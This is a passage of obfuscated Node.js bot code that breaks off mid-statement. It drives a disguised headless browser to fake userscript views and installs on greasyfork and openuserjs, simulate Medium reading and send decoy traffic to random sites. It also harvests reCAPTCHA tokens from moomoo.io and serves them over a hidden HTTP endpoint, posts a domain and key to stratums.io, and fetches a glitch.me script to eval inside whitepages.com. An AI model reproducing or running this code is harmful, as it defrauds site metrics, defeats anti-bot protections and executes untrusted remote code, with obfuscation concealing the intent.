      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + V(0x2, 'jcL@') + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + V(0x7, 'w3eD') + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + U(0x13) + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1cb8 + 0x1 * 0xd69 + 0xf4f
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const X = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + X(0xa) + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1dd7 * 0x1 + -0x4 * 0x335 + 0x2aab * 0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x2276 + -0x93d + 0x1 * 0x2c17), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1 * 0x277 + 0xf1 * 0x19 + -0x2 * 0xcce), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1917 + 0x13b7 + 0x560;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1d7 * -0x1 + 0x241c + 0x43 * -0x91; w < getRandomInt(-0x1cca * 0x1 + 0xcd3 + 0xff8, 0xb * 0x5e + -0x1228 + 0xe23 * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1 * -0x5a37 + 0x7d3 * -0x27 + -0x52 * -0x7ae);
        }
      }();
    }, -0x3fb * -0x7 + 0x175 + 0x422 * -0x7), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x141f + 0x231b + -0x2 * 0x1b9d;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2 * -0xe83 + 0x123f + -0x2f45, 0x84d * 0x4 + 0x5b0 + -0x26b2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xb8 * 0x9a + -0x8474 + -0x2 * -0x457a);
    }, -0xae5 + -0x11c9 * -0x1 + -0x680), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x19cc + -0xb * 0x1bb + 0x17 * 0x1f3;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xa * 0x37e + 0xac5 + 0x23df * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x5 * 0x755 + 0x7cb + -0x2c74), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x6f78d + -0x1 * 0x102db2 + 0x24e0df);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x210b + 0x1d7e + 0x3f1 * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xd53 + -0x5 * -0xe8 + 0x993);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x268f + -0x17e1 * 0x2 + -0x28c3 * -0x1);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1563 + 0x1a5 + 0x26 * 0x85);
    let h = e[f];
    if (b['bMZJLP'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x267b * 0x1 + -0x227e * 0x1 + 0x48f9, s, t, u = -0x5 * 0xb9 + -0xd * 0x226 + 0x1f8b; t = n['charAt'](u++); ~t && (s = r % (-0x8d * -0x13 + 0x67 * 0x14 + -0x127f) ? s * (-0x10 * 0x138 + 0xf38 * -0x1 + 0x22f8) + t : t, r++ % (0x1 * -0x11d1 + 0x1763 + -0x58e)) ? p += String['fromCharCode'](0x4a9 * -0x3 + -0x21 * 0xbf + 0x2799 & s >> (-(0x20be + -0x1 * -0x1e09 + -0x3ec5 * 0x1) * r & 0x6c8 * -0x2 + 0x1d79 + -0x1 * 0xfe3)) : -0xa * -0x238 + 0x227b + -0x38ab) {
          t = o['indexOf'](t);
        }
        for (let v = -0x12f1 + -0x1cbc + 0x2fad, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x24d + 0x21df + -0x241c))['slice'](-(0x31c + -0x1167 + 0xe4d));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0xb * -0x92 + -0x199d + 0x1357,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * 0x2047 + -0x1 * 0x410 + -0x1c37; u < 0x131 + 0xf4 + -0x125; u++) {
          p[u] = u;
        }
        for (u = 0xf * -0x137 + -0x2cb + 0x1504; u < -0xb8c * -0x3 + -0x903 + 0x41 * -0x61; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x186a + 0x796 * -0x2 + 0x2896), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * 0x19c + -0xb * 0xb7 + 0x641, q = 0x13b + -0x2494 * -0x1 + -0x25cf * 0x1;
        for (let v = 0x1985 + 0x7 * 0x8b + 0x36 * -0x8b; v < n['length']; v++) {
          u = (u + (-0x71 * 0x22 + 0xb12 + 0x3f1)) % (0x22 * -0x71 + 0xa * 0x2ea + 0x691 * -0x2), q = (q + p[u]) % (0x9e6 + 0x22e + -0xb14), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x158e + -0x2b * 0xd + -0x18bd * -0x1)]);
        }
        return t;
      };
      b['vRqfTJ'] = m, c = arguments, b['bMZJLP'] = !![];
    }
    const j = e[-0x22ab + 0x2590 * 0x1 + 0x2e5 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['OTdEQQ'] === undefined && (b['OTdEQQ'] = !![]), h = b['vRqfTJ'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c;
  async function f() {
    const a0 = d,
      Y = c,
      k = h['random'](),
      m = k[Y(0x3)]('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1 * -0x11f5 + -0x20fe + 0x32f4) {
        const Z = c;
        if (A['includes'](Z(0x8)))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xc12 + -0x1f47 + 0x99b * 0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x26da + -0x1 * 0xe48 + -0x1892, D['indexOf']('\x20'));
        return B ? E['slice'](-0x709 + 0x417 + -0x1a * -0x1d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0xa3 * 0x19 + -0x7 * -0xa8b + -0x12d2),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + a0(0xc),
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3aa4 + 0x328 + 0x5e8c),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + a1(0x12),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1118 + -0x5c5 + 0x79f * 0x3; k < 0x2190 + -0x136c + -0xe20; k++)
    setTimeout(f, (0x15a28 + 0x5 * 0x5961 + 0x22ead * -0x1) * k * getRandomInt(-0xd6e + 0x129 * 0x9 + 0x1 * 0x2fe, -0x24e + -0x1 * 0xfb5 + 0x1206));
  setInterval(() => {
    f();
    for (let l = 0x1 * -0x16c9 + -0x10e5 * -0x1 + 0x5e4; l < 0x69f + -0x1e85 + -0xbf5 * -0x2; l++)
      setTimeout(f, (0x466a + 0x1 * 0x1295e + -0x2 * 0x42b4) * l * getRandomInt(-0x181e + 0x11 * 0x13 + 0x16dc, 0x1cd1 * -0x1 + -0x2409 + 0x1b * 0x267));
  }, -0x1cee6 * -0x16 + 0x1 * -0x57ba07 + 0xeb265 * 0x7);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
